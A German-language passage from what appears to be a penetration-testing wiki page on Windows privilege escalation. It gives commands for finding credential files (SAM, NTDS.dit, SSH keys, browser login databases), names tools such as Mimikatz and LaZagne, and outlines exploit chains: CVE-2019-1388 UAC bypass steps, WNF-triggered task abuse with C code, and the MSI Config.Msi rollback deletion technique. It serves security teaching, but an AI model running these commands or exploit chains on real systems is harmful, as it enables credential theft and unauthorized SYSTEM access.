dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Zugangsdaten im Papierkorb

Sie sollten auch den Papierkorb auf Zugangsdaten überprüfen.

Prüfen Sie zugängliche Einträge im Papierkorb auf gelöschte Backups und Konfigurationsarchive sowie auf Dateien, deren Namen ausdrücklich auf Zugangsdaten hinweisen. Ein nützliches `.7z`-, `.zip`- oder `.rar`-Backup kann Monate alt sein und einen gewöhnlichen Dateinamen haben. Windows speichert den ursprünglichen Pfad und den Löschzeitpunkt in einem `$I`-Datensatz und die gelöschte Datei als zugehörigen `$R`-Eintrag. Prüfen Sie die Metadaten und die Leseberechtigung der aktuellen Identität, bevor Sie ein Archiv öffnen. Die Sichtbarkeit hängt vom Volume, der Benutzer-SID und den Dateiberechtigungen ab; eine leere Auflistung beweist daher nicht, dass kein wiederherstellbares Backup vorhanden ist. Betrachten Sie einen Archivnamen als Kandidaten für eine Überprüfung, nicht als Beweis dafür, dass das Archiv ein gültiges Geheimnis enthält.

Eine zugängliche gelöschte `.pfx`-Datei kann auch ein Hinweis auf Codesignierung sein. Wenn sie einen zugänglichen privaten Schlüssel enthält, kann dieser ein geändertes PowerShell-Skript signieren; [PowerShell benötigt ein Codesignaturzertifikat mit privatem Schlüssel](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), und [AppLocker-Herausgeberregeln prüfen die Identität des Signierers und den Geltungsbereich der Regel](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Die Ausführung unter einem anderen Konto setzt voraus, dass die aktuelle Identität das konkrete Skript ändern kann, eine wirksame Regel die daraus resultierende Signatur für das Skript und das Zielkonto akzeptiert und eine geplante Aufgabe oder ein anderer Prozess mit höheren Berechtigungen das Skript tatsächlich ausführt. Ein `.pfx`-Dateiname, der Betreff eines Zertifikats oder ein beschreibbares Skript allein belegt diese Voraussetzungen nicht. Prüfen Sie Metadaten, ACLs, Richtlinien und den geplanten Befehl, bevor Sie auf privates Schlüsselmaterial zugreifen oder die Aufgabe auslösen.

Prüfen Sie auch zugängliche Profil-Datenbanken von Messaging-Clients, Notizen und empfangene Dateien auf Hinweise auf Zugangsdaten. Ein BitLocker-Wiederherstellungsschlüssel-Export kann als HTML- oder TXT-Datei gespeichert sein, manchmal in einem entsprechend benannten Backup-Archiv. Solches Material kann Zugriff auf ein separates verschlüsseltes Datenvolume ermöglichen, das ältere Backups enthält; prüfen Sie das Volume und das Archiv nur, wenn der Zugriff autorisiert ist. Enthält ein Backup `NTDS.dit`, ist für die Offline-Wiederherstellung von Domänenzugangsdaten außerdem die zugehörige `SYSTEM`-Hive erforderlich, wie im [Workflow für Backups und privilegierte Gruppen](../active-directory-methodology/privileged-groups-and-token-privileges.md) beschrieben. Dateinamen und ein gesperrtes Volume allein belegen nicht, dass ein verwendbarer Wiederherstellungsschlüssel oder ein Domänen-Backup vorhanden ist.

Um in mehreren Programmen gespeicherte **Passwörter wiederherzustellen**, können Sie Folgendes verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### In der Registry

**Weitere mögliche Registry-Schlüssel mit Zugangsdaten**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**OpenSSH-Schlüssel aus der Registry extrahieren.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browser-Verlauf

Sie sollten nach Datenbanken suchen, in denen Passwörter von **Chrome oder Firefox** gespeichert sind.\
Sie sollten nach Datenbanken suchen, in denen Passwörter von **Chrome, Edge oder Firefox** gespeichert sind.\
Prüfen Sie auch den Verlauf, die Lesezeichen und die Favoriten der Browser, da dort möglicherweise **Passwörter gespeichert sind**.

Beim herkömmlichen **Default**-Profil des aktuellen Benutzers befindet sich `Login Data` unter `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, während `Local State` im übergeordneten Verzeichnis `User Data` liegt. [Microsoft dokumentiert den Standardspeicherort des Profils](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); ein anderes Profil oder eine `UserDataDir`-Richtlinie kann den Speicherort ändern. Das Vorhandensein der Dateien ist lediglich ein Hinweis auf einen möglichen Speicherort von Zugangsdaten: Prüfen Sie, ob die Dateien lesbar sind, ob der DPAPI-Kontext des betreffenden Benutzers oder anderes autorisiertes Schlüsselmaterial verfügbar ist und ob ein gespeicherter Login zu einem privilegierteren Konto gehört. Eine reine Auflistung von Pfaden muss weder die Datenbank öffnen noch entschlüsselte Passwörter ausgeben.

Für Firefox dokumentiert [Mozilla](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), dass `key4.db` und `logins.json` eines Profils die zugehörigen Schlüssel- und verschlüsselten Login-Dateien sind. Ihr Vorhandensein ist lediglich ein Hinweis: Prüfen Sie, ob beide Dateien lesbar sind, ob gespeicherte Einträge vorhanden sind und ob ein Primary Password den Schlüssel schützt, bevor Sie zu dem Schluss kommen, dass die Zugangsdaten verwendbar sind. Wenn ein wiederhergestellter Zugang zu einem Domänenkonto gehört, prüfen Sie die effektiven Gruppensteuerungsrechte dieses Kontos und separat die [LAPS-Berechtigungen zum Lesen oder Entschlüsseln des Passworts](../active-directory-methodology/laps.md) der Gruppe; Browser-Artefakte allein belegen keinen Pfad zu Administratorrechten.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ist eine in das Windows-Betriebssystem integrierte Technologie, die die **Kommunikation** zwischen Softwarekomponenten verschiedener Sprachen ermöglicht. Jede COM-Komponente wird über eine Klassen-ID (CLSID) **identifiziert**, und jede Komponente stellt Funktionen über eine oder mehrere Schnittstellen bereit, die über Schnittstellen-IDs (IIDs) identifiziert werden.

COM-Klassen und -Schnittstellen sind in der Registry unter **HKEY\CLASSES\ROOT\CLSID** beziehungsweise **HKEY\CLASSES\ROOT\Interface** definiert. Diese Registry wird durch Zusammenführen von **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** erstellt.

Innerhalb der CLSIDs dieser Registry finden Sie den untergeordneten Registrierungsschlüssel **InProcServer32**, der einen **Standardwert** enthält, der auf eine **DLL** verweist, sowie einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single- oder Multi-Threaded) oder **Neutral** (Thread Neutral) sein kann.

![Browser-Verlauf - COM DLL Overwriting: Innerhalb der CLSIDs dieser Registry finden Sie den untergeordneten Registrierungsschlüssel InProcServer32, der einen Standardwert enthält, der auf eine DLL verweist, sowie einen Wert ...](<../../images/image (729).png>)

Wenn Sie eine der ausgeführten **DLLs überschreiben** können, könnten Sie im Grunde **Ihre Berechtigungen erweitern**, falls diese DLL von einem anderen Benutzer ausgeführt wird.

Informationen dazu, wie Angreifer COM Hijacking als Persistenzmechanismus einsetzen, finden Sie hier:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Allgemeine Suche nach Passwörtern in Dateien und der Registry**

**Dateiinhalte durchsuchen**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Suche nach einer Datei mit einem bestimmten Dateinamen**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Durchsuche die Registry nach Schlüsselnamen und Passwörtern**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Tools, die nach Passwörtern suchen

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ist ein msf**-Plugin. Ich habe dieses Plugin erstellt, um **automatisch jedes Metasploit-POST-Modul auszuführen, das im Opfer nach Zugangsdaten sucht**.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien mit Passwörtern, die auf dieser Seite erwähnt werden.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres hervorragendes Tool, um Passwörter aus einem System auszulesen.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **Sitzungen**, **Benutzernamen** und **Passwörtern** für verschiedene Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Stell dir vor, **ein als SYSTEM laufender Prozess öffnet einen neuen Prozess** (`OpenProcess()`) mit **vollem Zugriff**. Derselbe Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Berechtigungen, der jedoch alle offenen Handles des Hauptprozesses erbt**.\
Wenn du dann **vollen Zugriff auf den Prozess mit niedrigen Berechtigungen hast**, kannst du dir das **offene Handle zum erstellten privilegierten Prozess** holen, das mit `OpenProcess()` erstellt wurde, und **Shellcode injizieren**.\
[Lies dieses Beispiel, um mehr darüber zu erfahren, **wie diese Schwachstelle erkannt und ausgenutzt werden kann**.](leaked-handle-exploitation.md)\
[Lies auch [diesen Beitrag für eine ausführlichere Erklärung, wie sich weitere offene Handles von Prozessen und Threads testen und missbrauchen lassen, wenn sie mit unterschiedlichen Berechtigungsstufen (nicht nur vollem Zugriff) vererbt werden](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared-Memory-Segmente, sogenannte **Pipes**, ermöglichen die Kommunikation und Datenübertragung zwischen Prozessen.

Windows bietet eine Funktion namens **Named Pipes**, über die nicht zusammengehörige Prozesse Daten austauschen können, auch über verschiedene Netzwerke hinweg. Das ähnelt einer Client/Server-Architektur mit den Rollen **Named-Pipe-Server** und **Named-Pipe-Client**.

Wenn ein **Client** Daten über eine Pipe sendet, kann der **Server**, der die Pipe eingerichtet hat, die **Identität des Clients annehmen**, sofern er über die erforderlichen **SeImpersonate**-Rechte verfügt. Wenn du einen **privilegierten Prozess** identifizierst, der über eine Pipe kommuniziert, die du nachahmen kannst, bietet sich dir die Möglichkeit, **höhere Berechtigungen zu erlangen**, indem du die Identität dieses Prozesses annimmst, sobald er mit der von dir eingerichteten Pipe interagiert. Anleitungen zur Durchführung eines solchen Angriffs findest du [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system).

Außerdem ermöglicht das folgende Tool, **eine Named-Pipe-Kommunikation mit einem Tool wie Burp abzufangen:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **Mit diesem Tool kannst du alle Pipes auflisten und anzeigen lassen, um privescs zu finden:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Der Telephony-Dienst (TapiSrv) stellt im Servermodus `\\pipe\\tapsrv` (MS-TRP) bereit. Ein entfernter, authentifizierter Client kann den auf Mailslots basierenden asynchronen Ereignispfad missbrauchen, um `ClientAttach` in einen beliebigen **4-Byte-Schreibvorgang** in eine vorhandene Datei umzuwandeln, in die `NETWORK SERVICE` schreiben kann. Anschließend kann er Telephony-Administratorrechte erlangen und eine beliebige DLL als Dienst laden. Der vollständige Ablauf:

- `ClientAttach` mit `pszDomainUser`, das auf einen vorhandenen, beschreibbaren Pfad gesetzt ist → der Dienst öffnet die Datei mit `CreateFileW(..., OPEN_EXISTING)` und verwendet sie für asynchrone Ereignisschreibvorgänge.
- Jedes Ereignis schreibt den vom Angreifer kontrollierten `InitContext` aus `Initialize` in diesen Handle. Registriere eine Line-App mit `LRegisterRequestRecipient` (`Req_Func 61`), löse `TRequestMakeCall` aus (`Req_Func 121`), rufe die Daten über `GetAsyncEvents` ab (`Req_Func 0`) und hebe anschließend die Registrierung auf bzw. fahre den Dienst herunter, um die deterministischen Schreibvorgänge zu wiederholen.
- Füge dich in `C:\Windows\TAPI\tsec.ini` zu `[TapiAdministrators]` hinzu, stelle die Verbindung wieder her und rufe dann `GetUIDllName` mit einem beliebigen DLL-Pfad auf, um `TSPI_providerUIIdentify` als `NETWORK SERVICE` auszuführen.

Weitere Informationen:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Sonstiges

### Dateierweiterungen, die unter Windows etwas ausführen können

Sieh dir die Seite **[https://filesec.io/](https://filesec.io/)** an.

### Missbrauch von Protocol Handlern / ShellExecute über Markdown-Renderer

An `ShellExecuteExW` weitergeleitete, anklickbare Markdown-Links können gefährliche URI-Handler (`file:`, `ms-appinstaller:` oder beliebige registrierte Schemes) auslösen und vom Angreifer kontrollierte Dateien als aktueller Benutzer ausführen. Siehe:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Befehlszeilen auf Passwörter überwachen**

Wenn du eine Shell als Benutzer erhältst, werden möglicherweise geplante Tasks oder andere Prozesse ausgeführt, die **Anmeldedaten in der Befehlszeile übergeben**. Das folgende Skript erfasst alle zwei Sekunden die Befehlszeilen von Prozessen, vergleicht den aktuellen Zustand mit dem vorherigen und gibt alle Unterschiede aus.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Passwörter aus Prozessen stehlen

## Von einem Benutzer mit niedrigen Berechtigungen zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn du Zugriff auf die grafische Benutzeroberfläche hast (über Konsole oder RDP) und UAC aktiviert ist, ist es in einigen Versionen von Microsoft Windows möglich, ein Terminal oder einen anderen Prozess als „NT\AUTHORITY SYSTEM“ von einem Benutzer ohne erhöhte Berechtigungen auszuführen.

Dadurch ist es möglich, mit derselben Schwachstelle gleichzeitig die Berechtigungen zu erweitern und UAC zu umgehen. Außerdem muss nichts installiert werden, und die während des Vorgangs verwendete Binärdatei ist von Microsoft signiert und herausgegeben.

Zu den betroffenen Systemen gehören unter anderem:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Um diese Schwachstelle auszunutzen, müssen die folgenden Schritte ausgeführt werden:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

You findest alle erforderlichen Dateien und Informationen im folgenden GitHub-Repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Von Administrator-Integritätsstufe Mittel zu Hoch / UAC Bypass

Lies dies, um **mehr über Integritätsstufen zu erfahren**:


{{#ref}}
integrity-levels.md
{{#endref}}

Lies dann dies, um **mehr über UAC und UAC Bypasses zu erfahren:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Upload-Verzeichnis-Junctions in ein bereitgestelltes Stammverzeichnis

Eine Anwendung kann ein vorhersehbares Upload-Unterverzeichnis erstellen, einen vom Aufrufer angegebenen Dateinamen darin speichern und die Datei dann verarbeiten. Kann ein Benutzer mit geringen Berechtigungen dieses Unterverzeichnis entfernen und durch eine NTFS-Junction ersetzen, bevor der serverseitige Schreibvorgang erfolgt, kann der Schreibvorgang der Junction in ein vom Webserver bereitgestelltes Verzeichnis folgen. Ein dort abgelegtes Skript kann mit der Identität des Webdienstes ausgeführt werden, wenn der Server diesen Dateityp ausführt. Dies ist eine anwendungsspezifische Grenze für beliebige Schreibvorgänge; ein beschreibbares Upload-Verzeichnis oder eine vorhandene Junction allein ist kein Beweis dafür.

Prüfe den genauen Pfadaufbau und den Zeitpunkt im Upload-Handler, die effektiven Rechte des Benutzers zum Löschen und Erstellen im Unterverzeichnis, die effektiven ACLs des Ziels, ob der Schreibprozess Reparse Points folgt und ob der Webserver Dateien in diesem Zielverzeichnis ausführt. Ermittle die Prozessidentitäten des Schreibprozesses und des Webservers getrennt. Eine passive Bestandsaufnahme kann Verzeichnis-ACLs und Reparse-Metadaten anzeigen, aber weder das Verhalten des Handlers noch einen späteren Austausch der Junction nachweisen. Wenn die Ausführung in einem Dienstkonto-Kontext erfolgt, prüfe den **tatsächlichen Prozesstoken**, bevor du einen separaten Pfad über Token-Berechtigungen in Betracht ziehst.

## Durch WNF ausgelöste Bereinigung privilegierter geplanter Tasks

Ein geplanter Task, der manuelle Ausführung verweigert, kann dennoch einen unprivilegierten Auslöser haben. Exportiere bei der Überprüfung eines privilegierten Tasks dessen XML und untersuche **alle** Trigger sowie die DACL des Tasks, den Prinzipal und die Aktion. Insbesondere bezeichnet ein `WnfStateChangeTrigger` einen Windows Notification Facility (WNF)-Zustand. Wenn dieser sicherbare Zustand dem aktuellen Benutzer das Veröffentlichen einer Aktualisierung erlaubt, kann der Benutzer den Task indirekt mit der konfigurierten Identität starten, obwohl `<AllowStartOnDemand>false</AllowStartOnDemand>` gesetzt ist.<sup>[[43]](#references)</sup>

Beispielsweise lief der Recall-Task `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` als SYSTEM, akzeptierte Aktualisierungen des WNF-Zustands `7508BCA32C079E41` von einem Standardbenutzer und untersuchte anschließend `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, selbst wenn Recall deaktiviert war.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Um die Erreichbarkeit zu testen, lösen Sie `ZwUpdateWnfStateData` aus `ntdll.dll` auf, übermitteln Sie ein leeres Update für den acht Byte langen Zustandsnamen und gleichen Sie den Rückgabestatus mit den Daten zur letzten Ausführung der Aufgabe oder den Procmon-Aktivitäten ab. Die folgende reduzierte Probe verwendet die Bytefolge aus dem Recall-Aufgabenbeispiel; ersetzen Sie sie durch die für die zu testende Aufgabe exportierten Bytes.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Privilegiertes Löschen durch rekursive Bereinigung auslösen

Die nützliche Primitive ist nicht allein der Trigger, sondern eine privilegierte Bereinigungsroutine, die ein vom Angreifer kontrolliertes Verzeichnis akzeptiert. Verfolge den Vorgang von der Auflistung bis zur abschließenden Änderung: Die Ermittlung von Profilen/Sitzungen, per Wildcard ausgewählte untergeordnete Elemente, `SHCreateItemFromParsingName` und `IFileOperation::DeleteItem` sind starke Hinweise darauf, dass ein zuvor überprüfter Pfad später rekursiv durchlaufen wird. Werden Nachfahren nicht relativ zu vertrauenswürdigen Verzeichnis-Handles geöffnet und vor dem Löschen überprüft, kann ein Angreifer die Pfadauflösung zwischen Auflistung und Verwendung ändern.<sup>[[43]](#references)</sup>

Kombiniere den WNF-Trigger mit der unten beschriebenen [Oplock-, Junction- und Object-Manager-Symlink-Substitution](#from-folder-contents-delete-to-system-eop): Der Oplock pausiert die Bereinigungsroutine, nachdem sie das legitime untergeordnete Element ausgewählt hat. Währenddessen wird der beschreibbare übergeordnete Pfad ersetzt, sodass das fortgesetzte privilegierte Löschen über `\RPC Control` auf das geschützte Ziel aufgelöst wird. In der Recall-Kette führte dies zum Löschen von `C:\Config.Msi` durch SYSTEM, das für die dokumentierte MSI-Rollback-Technik erforderlich war.<sup>[[31]](#references)[[43]](#references)</sup>

### Verschachtelte Nachfahren umgehen oberflächliche Reparse-Point-Fixes

Nur die vom Angreifer kontrollierte Wurzel und ihr unmittelbares untergeordnetes Element zu überprüfen, sichert kein rekursives pfadbasiertes Löschen ab. Lass diese überprüften Objekte legitim und verlagere die Junction-/Oplock-Substitution in ein zusätzliches untergeordnetes Element darunter; `IFileOperation::DeleteItem` erreicht schließlich den nicht überprüften Nachfahren und folgt dessen neuem Ziel. CVE-2026-20941 entstand genau durch diese Art unvollständigen Fixes: Der erste Recall-Patch überprüfte `UKP` und das GUID-förmige Verzeichnis, behielt aber den alten rekursiven Löschvorgang bei.<sup>[[43]](#references)</sup>

Das sichere Muster besteht darin, **jeden Nachfahren** relativ zu einem bereits vertrauenswürdigen Verzeichnis-Handle zu öffnen, den endgültig aufgelösten Pfad/das endgültig aufgelöste Objekt zu ermitteln und zu überprüfen und den Löschstatus auf dieses überprüfte Handle anzuwenden. Überprüfe nicht lediglich ein Präfix und verwende danach wieder rekursives pfadbasiertes Löschen. Prüfe beim Review von Patches außerdem die Strukturen am tatsächlichen Aufrufort: In diesem Fall zeigte die Laufzeitinspektion von `OBJECT_ATTRIBUTES` bei `NtCreateFile` ein nicht-null `RootDirectory` und einen relativen Namen `{GUID}\\secure_file.lock`. Damit wurde die irreführende Decompiler-Ausgabe widerlegt, die auf eine zweite `FILE_DELETE_ON_CLOSE`-Primitive hindeutete.<sup>[[43]](#references)</sup>

## Von beliebigem Löschen/Verschieben/Umbenennen eines Ordners zu SYSTEM-EoP

Die Technik wird [**in diesem Blogbeitrag**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beschrieben; Exploit-Code ist [**hier verfügbar**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Bei dem Angriff wird im Wesentlichen die Rollback-Funktion von Windows Installer missbraucht, um während der Deinstallation legitime Dateien durch schädliche zu ersetzen. Dazu muss der Angreifer einen **schädlichen MSI-Installer** erstellen, der den Ordner `C:\Config.Msi` kapert. Windows Installer verwendet diesen später, um während der Deinstallation anderer MSI-Pakete Rollback-Dateien zu speichern. Diese Rollback-Dateien werden so verändert, dass sie die schädliche Payload enthalten.

### Windows Installer: Einschleusen eines COM-Bereinigungspfads (CVE-2025-27727)

Ein Client mit geringen Berechtigungen kann über das COM-Objekt `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) den SYSTEM-Dienst `msiexec.exe` erreichen. Reverse Engineering identifizierte die relevanten `IMsiServer`-Aufrufe als `MsiBeginTransactionW` am vtable-Offset `0xA0`, `SetEEUIDirectoryAndFilter` bei `0xC8` und `CleanupTempPackages` bei `0x50`. Diese Namen und Offsets wurden durch Reverse Engineering ermittelt und können je nach Build variieren.<sup>[[41]](#references)</sup>

Bei einem Benutzer ohne Administratorrechte gibt `SetEEUIDirectoryAndFilter` den Aufrufer nur während des Öffnens des angegebenen Pfads mit `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` und `FILE_FLAG_OPEN_REPARSE_POINT` durch Impersonierung vor. Damit wird nachgewiesen, dass der Aufrufer das Verzeichnis löschen kann, und verhindert, dass einem Reparse Point gefolgt wird. Der geprüfte Datei-Handle wird dadurch jedoch **nicht** an die spätere Bereinigung gebunden und es wird auch nicht nachgewiesen, dass Windows Installer das Verzeichnis erstellt hat.<sup>[[41]](#references)</sup>

Nach `MsiBeginTransactionW` plant `SetEEUIDirectoryAndFilter` den Pfad unabhängig vom Filterargument des Aufrufers als Ordner ein. Der Dienst schreibt einen benannten `REG_DWORD`-Wert unter `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: Der Wertname ist der vom Aufrufer kontrollierte Pfad, und der Datenwert `0x00000002` kennzeichnet den Ordner. `CleanupTempPackages(NULL, FALSE)` startet anschließend direkt die Bereinigung. Der erhöhte Worker listet die Registrierungswerte auf und übergibt Ordner-Einträge ohne Prüfung ihrer Herkunft an das rekursive `FDeleteFolder`. Schlägt das normale Entfernen fehl, ruft der Code außerdem `LockdownPath` auf, löscht Dateiattribute und versucht es erneut.<sup>[[41]](#references)</sup>

Die aus `msi.dll` rekonstruierte minimale Aufrufsequenz lautet:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Das nützliche Primitive ist die Wiederverwendung des Pfads und nicht eine Junction-Umleitung. Registriere ein vom Angreifer erstelltes `C:\Config.Msi`, entferne es und lass Windows Installer später denselben Pfad mit geschützten Rollback-Daten erneut erstellen. Die Bereinigung vertraut dem veralteten Namen `TempPackages` und löscht das neue Verzeichnis als SYSTEM. Damit wird die vorgesehene Grenze durch `FILE_FLAG_OPEN_REPARSE_POINT` und die Mitigation für die Vertrauensprüfung von Umleitungen umgangen, da kein Reparse Point erforderlich ist.<sup>[[41]](#references)</sup>

Dieses Lösch-Primitive passt in die folgende Rollback-Kette: Bewahre den separaten `Installer\Folders`-Eintrag, lösche das geschützte `C:\Config.Msi`, erstelle es mit einer NULL-DACL neu und behalte einen Handle mit `WRITE_DAC`, bevor der Installer die DACL schützt. Mit dem zuvor geöffneten Handle kann eine permissive DACL mittels `NtSetSecurityObject` wiederhergestellt werden. Anschließend kann die erzeugte `.rbs` ersetzt werden, bevor das Rollback fortgesetzt wird.<sup>[[41]](#references)</sup>

Microsoft hat den Pfad korrigiert, indem verhindert wird, dass `CMsiTransaction::SetEEUIDirectoryAndFilter` `ScheduleFileOrFolderDelete` aufruft, wenn das neue Feature-Gate aktiviert ist. Der COM-Aufruf kann weiterhin Erfolg melden, fügt den vom Angreifer kontrollierten Pfad aber nicht mehr zu `TempPackages` hinzu. Installiere die Windows-Sicherheitsupdates vom April 2025, statt eine erfolgreiche Rückgabe der Methode als Patch-Test zu verwenden.<sup>[[41]](#references)[[42]](#references)</sup>

Die zusammengefasste Technik ist folgende:

1. **Stufe 1 – Vorbereitung des Hijacks (`C:\Config.Msi` leer lassen)**

- Schritt 1: MSI installieren
    - Erstelle eine `.msi`, die eine harmlose Datei (z. B. `dummy.txt`) in einem beschreibbaren Ordner (`TARGETDIR`) installiert.
    - Markiere den Installer als **„UAC Compliant“**, damit ein **Benutzer ohne Administratorrechte** ihn ausführen kann.
    - Lass nach der Installation einen **Handle** für die Datei geöffnet.

- Schritt 2: Deinstallation starten
    - Deinstalliere dieselbe `.msi`.
    - Der Deinstallationsprozess verschiebt Dateien nach `C:\Config.Msi` und benennt sie in `.rbf`-Dateien (Rollback-Backups) um.
    - **Überwache den geöffneten Datei-Handle** mit `GetFinalPathNameByHandle`, um zu erkennen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Schritt 3: Synchronisierung anpassen
